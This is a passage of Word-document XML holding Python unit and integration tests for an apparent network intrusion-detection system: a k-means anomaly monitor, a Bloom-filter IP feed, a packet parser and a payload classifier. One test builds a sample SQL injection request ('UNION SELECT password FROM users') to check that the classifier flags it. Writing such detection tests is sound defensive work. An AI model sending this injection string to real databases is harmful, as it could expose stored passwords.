          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51E1424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_warm(self, alpha=0.1, samples=25):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49B89C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 = kmeans.KMeansMonitor(k=3, learning_rate=alpha)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4D14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 in range(samples):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A14EFB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e.analyse(10 + (i % 3), 2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="603D04B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e</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FEAB407" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A09385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test_no_alert_during_warm_up(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EC2A2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 = kmeans.KMeansMonitor(k=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BDE9E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self.assertFalse(e.analyse(9000, 400).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1666BEA6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7EACB6C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test_familiar_traffic_is_not_flagged(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42ECCD4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 = self._warm()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="118C06A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_ in range(10):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43E89A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self.assertFalse(e.analyse(11, 2).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D8950AC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27E8A82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test_novel_traffic_is_flagged(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2387DF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 = self._warm()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EA62E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pps, ports in ((9000, 1), (60, 45), (300, 400)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38645F1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self.assertTrue(e.analyse(pps, ports).is_threat,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DA1F4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"pps=%d ports=%d not flagged" % (pps, ports))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4923A90B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7818DF9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test_anomalies_do_not_poison_the_model(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D46807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 = self._warm()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44BB42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baseline_before = e.distance_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EF4F5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_ in range(30):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7681377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e.analyse(9000, 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5639159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self.assertEqual(e.distance_baseline(), baseline_before)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66FD06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and it is still alerting after 30 seconds of attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13F36B9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self.assertTrue(e.analyse(9000, 1).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7315F5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="661E483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def test_confidence_grows_with_distance(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32C676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 = self._warm()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02C194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near = e.analyse(60, 45).confidence</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="576B753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far = e.analyse(90000, 1).confidence</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="507D13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self.assertGreater(far, near)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="696CA4BD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07F8D2A3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6FB560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TestBloomThreatIntel(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C524AE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setUp(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C10CF3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self.tmp = tempfile.mkdtemp()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BEB6E5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self.path = os.path.join(self.tmp, "feed.txt")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F5D4C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open(self.path, "w", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EEFCA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f.write("# comment line\n"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0031C6A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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="109F52F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"192.0.2.1\n"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B3F3E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"198.51.100.23  # inline note\n"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="544408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"203.0.113.5,csv style comment\n")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50F3E9DA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="385F21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tearDown(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="349D5B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shutil.rmtree(self.tmp, ignore_errors=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13C44914" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C344F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test_feed_loads_and_strips_comments(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD1DD1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bf = bloom.BloomFilter(size=500, hash_count=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="671B78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self.assertEqual(bf.load_feed(self.path), 3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23F321F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ip in ("192.0.2.1", "198.51.100.23", "203.0.113.5"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="416B6CA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self.assertTrue(bf.check(ip), "%s not loaded" % ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51352886" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F608A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test_unlisted_address_is_clean(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A67B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bf = bloom.BloomFilter(size=500, hash_count=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE9FF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bf.load_feed(self.path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01FEE9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self.assertFalse(bf.check("8.8.8.8"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B4F817A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2426F9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test_missing_feed_reports_failure(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="064B99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bf = bloom.BloomFilter(size=100, hash_count=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D5643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self.assertEqual(bf.load_feed(os.path.join(self.tmp, "nope.txt")), -1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1159FD71" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="445C913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test_false_positive_rate_grows_with_saturation(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3C01E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bf = bloom.BloomFilter(size=64, hash_count=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F2134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start = bf.false_positive_rate()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47EA3CA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 in range(20):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="002578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bf.add("10.0.0.%d" % i)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="389E21E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self.assertGreater(bf.false_positive_rate(), start)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2586642C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FBDAD0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test_no_false_negatives(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AA38C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the defining Bloom guarantee: anything added is always found</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F43BCB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bf = bloom.BloomFilter(size=2000, hash_count=4)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34AC3D9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added = ["172.16.%d.%d" % (i, j) for i in range(10) for j in range(10)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EC43DD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ip in added:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59848B5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bf.add(ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CE156B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ip in added:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BC8EF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self.assertTrue(bf.check(ip))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="668C170A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="275CD358" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F24A2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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B74FF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unittest.main(verbosity=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42875D81"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src/tests/test_integration.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E1AF082" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>403 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A8992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#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AC537B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"""Integration tests for the MANTIS data path.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF69EA7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="023131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`test_engines.py` exercises each engine's mathematics in isolation. This module</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="343A5F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verifies that components work correctly together along the real data path:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E736A00" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6CB6498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raw frame -&gt; PacketParser -&gt; engines -&gt; AlertDispatcher -&gt; log / telemetry</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2830B8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-&gt; PacketStore</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="701C76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-&gt; pcap export</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EFB4D12" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59C8581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Nothing here needs root, a network interface or live attack traffic, so the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E97A0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integration tier is reproducible on any machine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18FB0D1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72316419" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BD9F6E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json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23E13A3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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1282D1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shutil</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FB3C70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sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EE7FD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tempfile</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54EEAE3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unittest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="639F9734" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C788A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HERE = os.path.dirname(os.path.abspath(__file__))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3764081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SRC = os.path.dirname(HERE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13980C2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SRC not in sys.path:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B167F1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sys.path.insert(0, SRC)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39178B06" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="573D38F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replay</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62BE9E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sensor_node.dispatcher as dispatcher_mod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45E537A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sensor_node.parser as parser_mod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0594FE4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sensor_node.sensor as sensor_mod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FEB9FE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utils.logger as logger_mod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D61CD3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import utils.packet_store as packet_store</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C0A733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utils.pcap as pcap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77F32D0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from utils.config import Config</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4713E8F2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61DC5FC2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E5279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_RecordingDefense:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CFDD72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"""Stands in for iptables so tests never touch the host firewall."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5133F026" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5090BAB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__init__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B58FC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self.blocked = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FCEBBBC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39050B6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block_ip(self, ip):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1192CAF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self.blocked.append(ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4781B5E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True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="562B6981" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A7B61DD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A6639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TestParserToEngines(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EBD568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 synthetic attack frame must survive decode and reach a verdict."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50ADB470" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32F0116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setUp(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ED807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self.parser = parser_mod.PacketParser()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B65205" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D7541A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test_sqli_frame_decodes_and_is_flagged(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4663F06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import engines.naive_bayes as nb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="030B14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frame = parser_mod.build_tcp(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B2FDD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sport=44000, dport=80,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="566104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data=b"GET /?id=1 UNION SELECT password FROM users --")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62F6463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 = self.parser.parse(frame)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CF184A7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="787AC31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self.assertIsNotNone(pkt)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="189C6E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self.assertEqual(pkt["proto"], "TCP")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44576A7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self.assertEqual(pkt["dport"], 80)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="689C02D6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4425C1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 = nb.PayloadMonitor().analyse(pkt["payload"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="776A277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self.assertTrue(verdict.is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E78F3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self.assertIn("UNION", verdict.detail["keywords"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="412F89CC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57C639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test_benign_frame_is_not_flagged(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A8FBD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import engines.naive_bayes as nb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27694C8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frame = parser_mod.build_tcp(data=b"GET /index.html HTTP/1.1\r\n")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DA9CE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 = self.parser.parse(frame)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46716C0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self.assertFalse(nb.PayloadMonitor().analyse(pkt["payload"]).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="084ABC97" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3631911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test_truncated_frame_does_not_raise(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="269928C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 malformed frame must be rejected, not crash the analyzer thread</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CBF38C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bad in (b"", b"\x00" * 8, b"\xff" * 20, None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EF32C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self.assertIsNone(self.parser.parse(bad))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41EF9F3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self.assertEqual(self.parser.parsed, 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20BAC1B1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37A5613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test_vlan_tagged_frame_is_decoded(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E8E6F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import struct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="196B18E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inner = parser_mod.build_tcp(sport=1234, dport=443)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA7F1A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splice an 802.1Q tag between the MAC addresses and the EtherType</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11EF287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tagged = (inner[:12] + struct.pack("!HH", 0x8100, 0x0064)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EEFC3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struct.pack("!H", 0x0800) + inner[14:])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F21872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 = self.parser.parse(tagged)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="744A990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self.assertIsNotNone(pkt)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CDE05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self.assertEqual(pkt["dport"], 443)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C87C1E0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F2565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test_icmp_frame_is_decoded(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78A634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 = self.parser.parse(parser_mod.build_icmp(icmp_type=8))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B2C86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self.assertEqual(pkt["proto"], "ICMP")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16263D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self.assertEqual(pkt["icmp_type"], 8)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="541FCBC8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
